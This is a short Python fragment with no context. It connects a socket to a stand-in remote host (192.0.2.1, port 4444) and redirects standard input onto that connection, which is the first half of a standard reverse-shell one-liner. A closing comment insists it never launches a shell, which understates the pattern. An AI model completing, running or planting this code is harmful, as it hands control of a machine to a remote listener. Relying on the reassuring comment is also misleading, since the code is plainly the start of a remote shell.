import socket, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.0.2.1',4444))
os.dup2(s.fileno(), 0)
# This redirects input; it never launches a shell.
